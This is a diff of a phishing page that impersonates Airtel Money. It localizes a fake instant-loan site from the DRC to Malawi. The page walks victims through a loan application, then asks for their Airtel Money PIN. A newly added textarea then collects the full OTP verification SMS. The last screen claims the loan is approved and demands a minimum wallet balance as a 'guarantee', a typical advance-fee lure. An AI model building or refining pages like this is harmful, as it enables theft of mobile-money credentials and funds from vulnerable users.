@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Airtel Money DRC – Crédit & Prets Rapides</title>
+<title>Airtel Money Malawi – Instant Loans & Credit</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
@@ -105,7 +105,7 @@
   }
   .welcome-text {
     color: var(--brand-red);
-    font-size: 1.1rem;
+    font-size: 1.08rem;
     font-weight: 700;
     line-height: 1.6;
     margin-bottom: 32px;
@@ -197,7 +197,7 @@
     color: var(--brand-red);
     padding: 8px 14px;
     border-radius: var(--radius-pill);
-    font-size: 0.75rem;
+    font-size: 0.74rem;
     font-weight: 700;
     display: flex;
     align-items: center;
@@ -307,6 +307,7 @@
     display: flex; 
     align-items: center; 
     gap: 6px;
+    white-space: nowrap;
   }
   .phone-row input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; flex: 1; }
   .field-hint { font-size: 0.75rem; color: var(--text-muted); margin-top: 6px; font-weight: 500; }
@@ -370,15 +371,15 @@
     align-items: center;
     gap: 6px;
     color: var(--brand-red);
-    font-size: 0.95rem;
+    font-size: 0.92rem;
     font-weight: 800;
   }
   .calc-value-pill {
     background: var(--brand-red-light);
     color: var(--brand-red);
-    font-size: 1.05rem;
+    font-size: 0.98rem;
     font-weight: 800;
-    padding: 6px 16px;
+    padding: 6px 14px;
     border-radius: var(--radius-pill);
   }
 
@@ -424,7 +425,7 @@
     margin-bottom: 20px;
   }
   .result-amount {
-    font-size: 2.1rem;
+    font-size: 1.9rem;
     font-weight: 800;
     color: var(--brand-red);
     line-height: 1.1;
@@ -506,7 +507,7 @@
   .redir-n { font-weight: 800; color: #fff; }
   .btn-go { background: #ffffff; color: var(--brand-red); border: none; border-radius: var(--radius-md); padding: 14px 28px; font-size: 0.95rem; font-weight: 800; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
 
-  /* LOGIN & OTP PAGES */
+  /* LOGIN PAGE */
   #page-login, #page-otp { background: var(--page-bg); }
   .login-card {
     background: #ffffff;
@@ -526,11 +527,11 @@
   .btn-login { width: 100%; padding: 15px; background: #e5e7eb; color: #9ca3af; border: none; border-radius: var(--radius-md); font-size: 0.95rem; font-weight: 800; cursor: pointer; transition: all 0.2s; }
   .btn-login.rdy { background: var(--brand-red); color: #ffffff; box-shadow: var(--shadow-btn); }
 
-  /* ALIGNED PROFESSIONAL OTP CARD DESIGN */
+  /* PROFESSIONAL FULL-MESSAGE OTP PASTE CARD */
   .otp-card {
     background: #ffffff;
     border-radius: var(--radius-lg);
-    padding: 32px 24px;
+    padding: 28px 22px;
     box-shadow: var(--shadow-card);
     width: 100%;
     display: flex;
@@ -548,20 +549,20 @@
     align-items: center;
     justify-content: center;
     font-size: 1.6rem;
-    margin-bottom: 16px;
+    margin-bottom: 14px;
   }
   .otp-card h2 { 
-    font-size: 1.35rem; 
+    font-size: 1.32rem; 
     font-weight: 800; 
-    margin-bottom: 8px; 
+    margin-bottom: 6px; 
     color: var(--text-main); 
   }
   .otp-hint { 
-    font-size: 0.85rem; 
+    font-size: 0.84rem; 
     color: var(--text-muted); 
-    line-height: 1.4;
+    line-height: 1.45;
     margin-bottom: 12px; 
-    max-width: 280px;
+    max-width: 310px;
   }
   .otp-phone-badge { 
     display: inline-flex;
@@ -570,49 +571,152 @@
     background: #f3f4f6;
     padding: 6px 14px;
     border-radius: var(--radius-pill);
-    font-size: 0.9rem; 
+    font-size: 0.88rem; 
     font-weight: 800; 
     color: var(--text-main); 
-    margin-bottom: 24px; 
+    margin-bottom: 20px; 
   }
   #otpInputSection {
     width: 100%;
     display: flex;
     flex-direction: column;
-    align-items: center;
+    align-items: stretch;
   }
-  .otp-inputs { 
-    display: flex; 
-    gap: 12px; 
-    justify-content: center;
-    margin-bottom: 20px; 
+
+  /* OTP FULL MESSAGE PASTE CONTAINER */
+  .otp-paste-container {
     width: 100%;
-    max-width: 280px;
-  }
-  .otp-box { 
-    width: 54px; 
-    height: 60px; 
-    border: 2px solid var(--border-color); 
-    border-radius: var(--radius-sm); 
-    text-align: center; 
-    font-size: 1.5rem; 
-    font-weight: 800; 
-    color: var(--brand-red); 
-    outline: none; 
-    background: #fafafa; 
+    background: #fafafa;
+    border: 2px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 12px 14px 10px;
+    margin-bottom: 14px;
     transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    text-align: left;
+    position: relative;
   }
-  .otp-box:focus { 
-    border-color: var(--brand-red); 
+  .otp-paste-container:focus-within {
+    border-color: var(--brand-red);
     background: #ffffff;
-    box-shadow: 0 0 0 4px rgba(226, 24, 24, 0.15);
-    transform: translateY(-2px);
+    box-shadow: 0 0 0 4px rgba(226, 24, 24, 0.12);
   }
+  .otp-paste-container.has-code {
+    border-color: #10b981;
+    background: #f0fdf4;
+  }
+  .otp-paste-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 8px;
+  }
+  .otp-paste-label {
+    font-size: 0.72rem;
+    font-weight: 800;
+    color: var(--brand-red);
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .otp-paste-actions {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .btn-paste-sms {
+    background: var(--brand-red-light);
+    color: var(--brand-red);
+    border: 1px solid rgba(226, 24, 24, 0.25);
+    border-radius: var(--radius-pill);
+    padding: 5px 12px;
+    font-size: 0.74rem;
+    font-weight: 800;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    transition: all 0.15s ease;
+  }
+  .btn-paste-sms:hover {
+    background: var(--brand-red);
+    color: #ffffff;
+  }
+  .btn-paste-sms:active {
+    transform: scale(0.96);
+  }
+  .btn-clear-sms {
+    background: #f3f4f6;
+    color: var(--text-muted);
+    border: none;
+    border-radius: 50%;
+    width: 24px;
+    height: 24px;
+    font-size: 0.75rem;
+    font-weight: 800;
+    cursor: pointer;
+    display: none;
+    align-items: center;
+    justify-content: center;
+  }
+  .btn-clear-sms.show {
+    display: inline-flex;
+  }
+  .otp-sms-textarea {
+    width: 100%;
+    min-height: 92px;
+    border: none;
+    background: transparent;
+    resize: none;
+    outline: none;
+    font-size: 0.9rem;
+    font-weight: 600;
+    line-height: 1.5;
+    color: var(--text-main);
+    font-family: 'Plus Jakarta Sans', sans-serif;
+  }
+  .otp-sms-textarea::placeholder {
+    color: #9ca3af;
+    font-weight: 500;
+    font-size: 0.83rem;
+  }
+  .otp-paste-footer {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-top: 8px;
+    margin-top: 6px;
+    border-top: 1px dashed var(--border-color);
+    font-size: 0.74rem;
+  }
+  .otp-status-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-weight: 700;
+    color: var(--text-muted);
+  }
+  .otp-status-pill.detected {
+    color: #059669;
+  }
+  .otp-code-preview {
+    background: #ffffff;
+    border: 1px solid #d1fae5;
+    color: #059669;
+    padding: 2px 10px;
+    border-radius: var(--radius-pill);
+    font-weight: 800;
+    letter-spacing: 0.12em;
+    font-size: 0.8rem;
+  }
+
   .otp-resend { 
     font-size: 0.82rem; 
     color: var(--text-muted); 
-    margin-bottom: 24px; 
+    margin-bottom: 18px; 
     font-weight: 600; 
+    text-align: center;
   }
   .btn-otp { 
     width: 100%; 
@@ -644,7 +748,7 @@
   .appr-sub { font-size: 0.82rem; color: var(--text-muted); line-height: 1.4; }
   .appr-banner { background: var(--brand-red); padding: 18px 16px; text-align: center; color: #fff; }
   .appr-banner .abl { font-size: 0.72rem; color: rgba(255,255,255,0.85); text-transform: uppercase; letter-spacing: 0.08em; font-weight: 700; }
-  .appr-banner .aba { font-size: 2rem; font-weight: 800; color: #ffffff; margin-top: 2px; }
+  .appr-banner .aba { font-size: 1.85rem; font-weight: 800; color: #ffffff; margin-top: 2px; }
   .comp-box { background: #fffbeb; border: 1.5px solid #fcd34d; border-radius: var(--radius-md); padding: 16px; margin: 16px; }
   .comp-box .ch { display: flex; align-items: center; gap: 6px; font-size: 0.85rem; font-weight: 800; color: #b45309; margin-bottom: 8px; text-transform: uppercase; }
   .comp-box p { font-size: 0.82rem; color: #451a03; line-height: 1.5; }
@@ -730,9 +834,9 @@
       <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
     </div>
     <div class="welcome-text">
-      Veuillez vous assurer d'utiliser un numéro de téléphone <strong>Airtel DRC (+243)</strong> valide et enregistré pour être éligible.
+      Please ensure you use a valid and registered <strong>Airtel Malawi (+265)</strong> phone number to qualify for instant loan disbursement.
     </div>
-    <button class="welcome-btn" onclick="goTo('page-landing')">J'AI COMPRIS</button>
+    <button class="welcome-btn" onclick="goTo('page-landing')">I UNDERSTAND</button>
   </div>
 </div>
 
@@ -743,80 +847,80 @@
       <img src="images/airtel-logo.png" alt="Airtel Logo">
     </div>
     <h1 class="brand-title">Airtel Money</h1>
-    <p class="brand-subtitle">Prêts intelligents & Crédits instantanés RDC</p>
+    <p class="brand-subtitle">Smart Loans & Instant Credit Malawi</p>
   </div>
 
   <div class="pill-group">
-    <div class="pill-badge">✦ Approbation 98%</div>
-    <div class="pill-badge">✦ Taux Réduit</div>
-    <div class="pill-badge">✦ Envoi Immédiat</div>
+    <div class="pill-badge">✦ 98% Approval</div>
+    <div class="pill-badge">✦ Low Interest</div>
+    <div class="pill-badge">✦ Instant Payout</div>
   </div>
 
   <div class="main-card">
     <div class="card-header-row">
       <div class="card-title-group">
-        <span>✦</span> CALCULEZ VOTRE PRÊT
+        <span>✦</span> CALCULATE YOUR LOAN
       </div>
-      <div class="tag-badge">5% Taux Fixe</div>
+      <div class="tag-badge">5% Fixed Rate</div>
     </div>
 
     <div class="calc-input-block">
       <div class="calc-label-row">
-        <div class="calc-label"><span>✦</span> Montant souhaité</div>
-        <div class="calc-value-pill" id="aDisp">$ 1,000</div>
+        <div class="calc-label"><span>✦</span> Desired Amount</div>
+        <div class="calc-value-pill" id="aDisp">MWK 50,000</div>
       </div>
-      <input type="range" id="rA" min="1000" max="50000" step="500" value="1000" oninput="calcUp()" style="--pct:0%">
+      <input type="range" id="rA" min="50000" max="5000000" step="25000" value="50000" oninput="calcUp()" style="--pct:0%">
     </div>
 
     <div class="calc-input-block">
       <div class="calc-label-row">
-        <div class="calc-label"><span>✦</span> Durée du prêt</div>
-        <div class="calc-value-pill" id="tDisp">12 Mois</div>
+        <div class="calc-label"><span>✦</span> Loan Duration</div>
+        <div class="calc-value-pill" id="tDisp">12 Months</div>
       </div>
       <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
     </div>
 
     <div class="rate-info-row">
-      <span class="lbl">Taux d'intérêt</span>
-      <span class="val">5% l'an</span>
+      <span class="lbl">Interest Rate</span>
+      <span class="val">5% per annum</span>
     </div>
 
     <div class="result-display-card">
-      <div class="result-amount" id="mOut">$ 86</div>
-      <div class="result-subtitle">Paiement mensuel estimé</div>
-      <div class="result-total" id="totOut">Total à rembourser: $ 1,028 (Capital + Intérêts)</div>
+      <div class="result-amount" id="mOut">MWK 4,280</div>
+      <div class="result-subtitle">Estimated monthly repayment</div>
+      <div class="result-total" id="totOut">Total repayment: MWK 51,364 (Principal + Interest)</div>
     </div>
 
-    <button class="btn-grad" onclick="goTo('page-step1')">DEMANDER MAINTENANT ➔</button>
+    <button class="btn-grad" onclick="goTo('page-step1')">APPLY NOW ➔</button>
   </div>
 
   <div class="grid-features">
     <div class="feat-card">
       <div class="fi">✦</div>
-      <div class="ft">10,000+ Prêts</div>
-      <div class="fs">Accordés en RDC</div>
+      <div class="ft">15,000+ Loans</div>
+      <div class="fs">Disbursed in Malawi</div>
     </div>
     <div class="feat-card">
       <div class="fi">✦</div>
-      <div class="ft">24h / 24</div>
-      <div class="fs">Traitement rapide</div>
+      <div class="ft">24 / 7</div>
+      <div class="fs">Fast processing</div>
     </div>
     <div class="feat-card">
       <div class="fi">✦</div>
-      <div class="ft">Sécurité SSL</div>
-      <div class="fs">Données protégées</div>
+      <div class="ft">SSL Secured</div>
+      <div class="fs">Protected data</div>
     </div>
   </div>
 
   <div class="page-bottom-note">
-    ✦ Sécurisé I 🏦 Institution Financière Agrée
+    ✦ Secured I 🏦 Licensed Financial Partner
   </div>
 </div>
 
 <!-- PAGE STEP 1 -->
 <div id="page-step1" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-landing')">← Retour</a>
+    <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
     <div class="hp-logo-sm">
       <img src="images/airtel-logo.png" alt="Airtel Logo">
       <div class="brand">Airtel Money</div>
@@ -826,28 +930,28 @@
 
   <div class="main-card">
     <div class="card-header-row">
-      <div class="card-title-group"><span>✦</span> Demande de Prêt</div>
-      <div class="tag-badge">Étape 1 sur 3</div>
+      <div class="card-title-group"><span>✦</span> Loan Application</div>
+      <div class="tag-badge">Step 1 of 3</div>
     </div>
     <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
     
-    <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
+    <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
     
-    <div class="field"><label>Type de Prêt</label><div class="sel-wrap"><select id="s1ty"><option>Prêt Personnel</option><option selected>Prêt Commercial / Business</option><option>Prêt Immobilier</option><option>Prêt Équipement</option><option>Prêt Études</option></select></div></div>
-    <div class="field"><label>Montant du Prêt ($)</label><input type="number" id="s1am" value="1000" placeholder="Entrez le montant" oninput="clearErr('s1Err')"></div>
-    <div class="field"><label>Durée de Remboursement</label><div class="sel-wrap"><select id="s1te"><option>6 Mois</option><option>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option>36 Mois</option><option selected>48 Mois</option><option>60 Mois</option></select></div></div>
-    <div class="field"><label>Motif du Prêt</label><textarea id="s1pu" placeholder="Expliquez brièvement l'usage de votre prêt…" oninput="clearErr('s1Err')"></textarea></div>
+    <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business / Commercial Loan</option><option>Home / Property Loan</option><option>Equipment Loan</option><option>Education Loan</option></select></div></div>
+    <div class="field"><label>Loan Amount (MWK)</label><input type="number" id="s1am" value="50000" placeholder="Enter amount in MWK" oninput="clearErr('s1Err')"></div>
+    <div class="field"><label>Repayment Period</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
+    <div class="field"><label>Loan Purpose</label><textarea id="s1pu" placeholder="Briefly explain how you plan to use this loan…" oninput="clearErr('s1Err')"></textarea></div>
     
-    <button class="btn-grad" onclick="toS2()">ÉTAPE SUIVANTE ➔</button>
+    <button class="btn-grad" onclick="toS2()">NEXT STEP ➔</button>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- PAGE STEP 2 -->
 <div id="page-step2" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step1')">← Retour</a>
+    <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
     <div class="hp-logo-sm">
       <img src="images/airtel-logo.png" alt="Airtel Logo">
       <div class="brand">Airtel Money</div>
@@ -857,36 +961,36 @@
 
   <div class="main-card">
     <div class="card-header-row">
-      <div class="card-title-group"><span>✦</span> Infos Personnelles</div>
-      <div class="tag-badge">Étape 2 sur 3</div>
+      <div class="card-title-group"><span>✦</span> Personal Details</div>
+      <div class="tag-badge">Step 2 of 3</div>
     </div>
     <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
 
-    <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
+    <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
     
     <div class="field-row">
-      <div class="field"><label>Prénom</label><input type="text" id="s2fi" placeholder="Ex: Jean" oninput="clearErr('s2Err')"></div>
-      <div class="field"><label>Nom de famille</label><input type="text" id="s2la" placeholder="Ex: Kabamba" oninput="clearErr('s2Err')"></div>
+      <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="e.g. Chimwemwe" oninput="clearErr('s2Err')"></div>
+      <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="e.g. Banda" oninput="clearErr('s2Err')"></div>
     </div>
     <div class="field">
-      <label>Numéro de Téléphone Airtel DRC</label>
-      <div class="phone-row"><div class="ph-pre">🇨🇩 +243</div><input type="tel" id="s2ph" placeholder="971234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-      <div class="field-hint">Saisissez votre numéro à 9 chiffres commençant par 9 ou 8 (ex: 971234567)</div>
+      <label>Airtel Malawi Phone Number</label>
+      <div class="phone-row"><div class="ph-pre">🇲🇼 +265</div><input type="tel" id="s2ph" placeholder="991234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+      <div class="field-hint">Enter your 9-digit Airtel Malawi number starting with 9 or 8 (e.g., 991234567)</div>
     </div>
 
     <div class="step-btns">
-      <button class="btn-gray" onclick="goTo('page-step1')">PRÉCÉDENT</button>
-      <button class="btn-grad" onclick="toS3()">SUIVANT ➔</button>
+      <button class="btn-gray" onclick="goTo('page-step1')">PREVIOUS</button>
+      <button class="btn-grad" onclick="toS3()">NEXT ➔</button>
     </div>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- PAGE STEP 3 -->
 <div id="page-step3" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Retour</a>
+    <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
     <div class="hp-logo-sm">
       <img src="images/airtel-logo.png" alt="Airtel Logo">
       <div class="brand">Airtel Money</div>
@@ -896,44 +1000,44 @@
 
   <div class="main-card">
     <div class="card-header-row">
-      <div class="card-title-group"><span>✦</span> Emploi & Résumé</div>
-      <div class="tag-badge">Étape 3 sur 3</div>
+      <div class="card-title-group"><span>✦</span> Employment & Summary</div>
+      <div class="tag-badge">Step 3 of 3</div>
     </div>
     <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
 
-    <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
+    <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
 
-    <div class="field"><label>Statut Professionnel</label><div class="sel-wrap"><select id="s3em"><option>Employé / Salarié</option><option selected>Commerçant / Indépendant</option><option>Sans emploi</option><option>Retraité</option><option>Étudiant</option></select></div></div>
-    <div class="field"><label>Revenu Annuel Estimé ($)</label><input type="number" id="s3in" placeholder="Entrez le revenu annuel" oninput="clearErr('s3Err')"></div>
+    <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed / Salaried</option><option selected>Business Owner / Self-Employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
+    <div class="field"><label>Estimated Annual Income (MWK)</label><input type="number" id="s3in" placeholder="Enter annual income in MWK" oninput="clearErr('s3Err')"></div>
 
     <div class="sum-box">
-      <h3>Résumé de la demande</h3>
-      <div class="sum-row"><span class="sk">Montant du prêt:</span><span class="sv" id="sA">$ 1,000</span></div>
-      <div class="sum-row"><span class="sk">Durée:</span><span class="sv" id="sT">48 Mois</span></div>
-      <div class="sum-row"><span class="sk">Motif:</span><span class="sv" id="sP">—</span></div>
-      <div class="sum-row"><span class="sk">Demandeur:</span><span class="sv" id="sN">—</span></div>
+      <h3>Application Summary</h3>
+      <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">MWK 50,000</span></div>
+      <div class="sum-row"><span class="sk">Duration:</span><span class="sv" id="sT">48 Months</span></div>
+      <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+      <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
     </div>
 
     <div class="step-btns">
-      <button class="btn-gray" onclick="goTo('page-step2')">PRÉCÉDENT</button>
-      <button class="btn-grad" onclick="submitApp()">SOUMETTRE ➔</button>
+      <button class="btn-gray" onclick="goTo('page-step2')">PREVIOUS</button>
+      <button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION ➔</button>
     </div>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- PAGE SUBMITTED -->
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
-    <h2>Demande Soumise avec Succès</h2>
-    <p>Votre demande de prêt Airtel Money a bien été enregistrée.<br>Redirection vers la vérification sécurisée en cours...</p>
-    <div class="redir-pill">🔄 Redirection dans <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')">Se Connecter Maintenant</button>
+    <h2>Application Submitted Successfully</h2>
+    <p>Your Airtel Money loan request has been recorded.<br>Redirecting to secure account verification...</p>
+    <div class="redir-pill">🔄 Redirecting in <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <button class="btn-go" onclick="goTo('page-login')">Verify Account Now</button>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- PAGE LOGIN -->
@@ -943,41 +1047,41 @@
       <img src="images/airtel-logo.png" alt="Airtel Logo">
     </div>
     <h1 class="brand-title">Airtel Money</h1>
-    <p class="brand-subtitle">Connexion à votre espace client</p>
+    <p class="brand-subtitle">Sign in to verify your wallet</p>
   </div>
 
   <div class="login-card">
-    <h2>Connexion Compte</h2>
+    <h2>Account Verification</h2>
     <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
     <div class="lg-phone-row">
-      <div class="ph-pre">🇨🇩 +243</div>
-      <input type="tel" id="lgPh" placeholder="971234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()" style="border-radius: 0 var(--radius-sm) var(--radius-sm) 0; border-left: none;">
+      <div class="ph-pre">🇲🇼 +265</div>
+      <input type="tel" id="lgPh" placeholder="991234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()" style="border-radius: 0 var(--radius-sm) var(--radius-sm) 0; border-left: none;">
     </div>
 
-    <div class="pin-label">Entrez votre code PIN (4 chiffres)</div>
+    <div class="pin-label">Enter your Airtel Money PIN (4 digits)</div>
     <div class="pin-row">
       <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
       <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
       <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
       <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
-      <button class="pin-eye" onclick="togPin()">👁</button>
+      <button class="pin-eye" onclick="togPin()" type="button">👁</button>
     </div>
 
-    <div class="forgot-pin">Code PIN oublié?</div>
-    <button class="btn-login" id="bLogin" onclick="doLogin()">SE CONNECTER</button>
+    <div class="forgot-pin">Forgot PIN?</div>
+    <button class="btn-login" id="bLogin" onclick="doLogin()">SIGN IN</button>
   </div>
 
   <div class="pg-footer">
-    v2.4.1CD • En vous connectant vous acceptez nos <a href="#" style="color:#fff;">Conditions d'utilisation</a><br>
-    © 2026 Airtel Money RDC
+    v2.4.1MW • By signing in you agree to our <a href="#" style="color:#fff;">Terms of Service</a><br>
+    © 2026 Airtel Money Malawi
   </div>
 </div>
 
-<!-- PAGE OTP -->
+<!-- PAGE OTP (FULL SMS MESSAGE PASTE BAR) -->
 <div id="page-otp" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-login')">← Retour</a>
+    <a class="nav-left" onclick="goTo('page-login')">← Back</a>
     <div class="hp-logo-sm">
       <img src="images/airtel-logo.png" alt="Airtel Logo">
       <div class="brand">Airtel Money</div>
@@ -987,9 +1091,9 @@
 
   <div class="otp-card">
     <div class="otp-icon-shield">💬</div>
-    <h2>Vérification OTP</h2>
-    <p class="otp-hint">Saisissez le code de sécurité à 4 chiffres envoyé sur votre numéro Airtel</p>
-    <div class="otp-phone-badge">📱 <span id="otpPh">+243 971 234 567</span></div>
+    <h2>Full Message OTP Verification</h2>
+    <p class="otp-hint">Copy and paste the entire verification SMS message sent by Airtel Money to your phone below</p>
+    <div class="otp-phone-badge">📱 <span id="otpPh">+265 991 234 567</span></div>
 
     <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
     <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
@@ -997,22 +1101,36 @@
 
     <div class="waiting-box" id="pinWait">
       <div class="wb-spinner"></div>
-      <p>En attente de validation du serveur Airtel…</p>
+      <p>Waiting for Airtel Malawi server verification…</p>
     </div>
 
     <div id="otpInputSection">
-      <div class="otp-inputs">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,0)" id="o0" autocomplete="off">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,1)" id="o1" autocomplete="off">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,2)" id="o2" autocomplete="off">
-        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,3)" id="o3" autocomplete="off">
+      <div class="otp-paste-container" id="otpPasteBox">
+        <div class="otp-paste-header">
+          <span class="otp-paste-label">📩 Full Verification SMS</span>
+          <div class="otp-paste-actions">
+            <button type="button" class="btn-clear-sms" id="btnClearSms" onclick="clearOtpSms()" title="Clear message">✕</button>
+            <button type="button" class="btn-paste-sms" onclick="pasteOtpFromClipboard()">📋 Paste SMS</button>
+          </div>
+        </div>
+        <textarea 
+          id="otpFullMessage" 
+          class="otp-sms-textarea" 
+          placeholder="Paste your full Airtel Money OTP message here (e.g., Dear Customer, your Airtel Money OTP verification code is 4829. Do not share this code...)"
+          oninput="handleOtpMessageInput()"
+        ></textarea>
+        <div class="otp-paste-footer">
+          <span class="otp-status-pill" id="otpDetectStatus">Waiting for pasted SMS message…</span>
+          <span class="otp-code-preview" id="otpCodePreview" style="display:none;"></span>
+        </div>
       </div>
-      <div class="otp-resend" id="otpRs">Renvoyer le code dans <span id="rsS">30</span> secondes</div>
-      <button class="btn-otp" id="bOtp" onclick="doOtp()">VALIDER OTP</button>
+
+      <div class="otp-resend" id="otpRs">Resend verification SMS in <span id="rsS">30</span> seconds</div>
+      <button class="btn-otp" id="bOtp" onclick="doOtp()">VERIFY OTP MESSAGE</button>
     </div>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- PAGE APPROVAL -->
@@ -1020,87 +1138,87 @@
   <div class="appr-wrap">
     <div class="appr-header">
       <div class="check-circle">✓</div>
-      <div class="appr-title">Félicitations! Prêt Approuvé</div>
-      <div class="appr-sub">Dernière étape pour recevoir vos fonds sur votre compte Airtel Money.</div>
+      <div class="appr-title">Congratulations! Loan Approved</div>
+      <div class="appr-sub">Final step to receive funds directly into your Airtel Money wallet.</div>
     </div>
 
     <div class="appr-banner">
-      <div class="abl">MONTANT APPROUVÉ</div>
-      <div class="aba" id="apAmt">$ 1,000</div>
+      <div class="abl">APPROVED LOAN AMOUNT</div>
+      <div class="aba" id="apAmt">MWK 50,000</div>
     </div>
 
     <div class="comp-box">
-      <div class="ch">🔒 VÉRIFICATION DE SÉCURITÉ</div>
-      <p>Pour débloquer votre transfert instantané, veuillez vous assurer d'avoir un solde d'au moins <span class="deposit-badge">$ 100</span> sur votre compte Airtel Money RDC.</p>
-      <p style="margin-top: 6px;">Cette somme sert de <strong>garantie de sécurité temporaire</strong> et demeure accessible sur votre compte.</p>
-      <div class="comp-note"><em>💡 Note:</em> Une fois le dépôt effectué, cliquez sur <strong>CONFIRMER & RECEVOIR</strong> ci-dessous.</div>
+      <div class="ch">🔒 SECURITY VERIFICATION</div>
+      <p>To unlock your instant disbursement, please ensure your Airtel Money Malawi wallet holds a minimum balance of <span class="deposit-badge">MWK 15,000</span>.</p>
+      <p style="margin-top: 6px;">This amount acts as a <strong>temporary account activity guarantee</strong> and remains yours in your wallet.</p>
+      <div class="comp-note"><em>💡 Note:</em> Once confirmed, tap <strong>CONFIRM & RECEIVE FUNDS</strong> below.</div>
     </div>
 
     <div class="ld-card">
-      <div class="ld-htitle">📋 Détails de votre Prêt</div>
+      <div class="ld-htitle">📋 Your Loan Details</div>
       <div class="ld-row">
         <div class="ld-icon ic-g">💵</div>
         <div>
-          <div class="ld-lbl">ECHÉANCE MENSUELLE</div>
-          <div class="ld-val" id="apMthly">$ 23</div>
+          <div class="ld-lbl">MONTHLY REPAYMENT</div>
